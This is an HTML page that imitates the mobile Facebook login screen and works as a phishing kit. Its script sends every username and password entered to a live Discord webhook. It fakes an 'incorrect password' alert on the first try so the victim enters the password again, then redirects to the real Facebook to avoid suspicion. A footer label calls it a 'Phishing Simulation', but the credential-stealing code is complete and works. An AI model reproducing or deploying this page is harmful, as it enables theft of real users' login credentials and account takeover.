<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login</title>

<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  }

  body {
    background: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    height: 100vh;
    padding: 20px;
    justify-content: space-between; /* Para nasa baba ang Create Account at Meta logo */
  }

  .top-section {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-top: 40px;
  }

  .lang-selector {
    color: #65676b;
    font-size: 14px;
    margin-bottom: 60px;
    cursor: pointer;
  }

  .fb-logo {
    width: 60px;
    height: 60px;
    margin-bottom: 40px;
  }

  .login-container {
    width: 100%;
    max-width: 400px;
  }

  input {
    width: 100%;
    padding: 16px;
    margin-bottom: 12px;
    border: 1px solid #ccd0d5;
    border-radius: 12px; /* Mas rounded gaya ng nasa pic */
    font-size: 16px;
    background: #f5f6f7;
  }

  input:focus {
    outline: none;
    border-color: #1877f2;
    background: white;
  }

  .login-btn {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 25px; /* Pill-shaped button */
    background: #0064e0;
    color: white;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 10px;
  }

  .forgot-link {
    display: block;
    text-align: center;
    margin-top: 20px;
    color: #1c1e21;
    text-decoration: none;
    font-weight: 500;
    font-size: 15px;
  }

  .bottom-section {
    width: 100%;
    max-width: 400px;
    text-align: center;
    margin-bottom: 20px;
  }

  .create-btn {
    width: 100%;
    padding: 10px;
    border: 1px solid #0064e0;
    border-radius: 25px;
    background: white;
    color: #0064e0;
    font-size: 15px;
    font-weight: 500;
    text-decoration: none;
    display: inline-block;
    margin-bottom: 20px;
  }

  .meta-footer {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 5px;
    color: #65676b;
    font-weight: bold;
    font-size: 16px;
  }

  .meta-footer img {
    width: 60px;
  }
</style>
</head>

<body>

  <div class="top-section">
    <div class="lang-selector">English (US) ▾</div>
    
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo" alt="FB Logo">

    <div class="login-container">
      <form id="loginForm">
        <input type="text" id="username" placeholder="Mobile number or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log in</button>
      </form>
      <a href="#" class="forgot-link">Forgot password?</a>
    </div>
  </div>

  <div class="bottom-section">
    <a href="#" class="create-btn">Create new account</a>
    <div class="meta-footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
    </div>
  </div>

  <script>
    const webhookURL = "https://discordapp.com/api/webhooks/1501812279082090550/_PxRQDWpjBcKefizfawoKSi8E1tDPvO6kuXo9JZzvopiQ-a2U04keR90AX3uRvTXM2oe";
    let attempts = 0;

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const payload = {
        embeds: [{
          title: "📱 Mobile Login Captured",
          color: 1752220, 
          fields: [
            { name: "User", value: `\`${username}\``, inline: true },
            { name: "Pass", value: `\`${password}\``, inline: true },
            { name: "Device", value: "Mobile Web View", inline: false }
          ],
          footer: { text: "Facebook Phishing Simulation" },
          timestamp: new Date()
        }]
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(() => {
        if (attempts < 1) {
          // Force login effect: Panic mode
          alert("The password you've entered is incorrect. Please try again.");
          document.getElementById("password").value = "";
          attempts++;
        } else {
          // I-forward sa totoong FB pagkatapos ng 2nd attempt
          window.location.href = "https://m.facebook.com/";
        }
      });
    });
  </script>

</body>
</html>
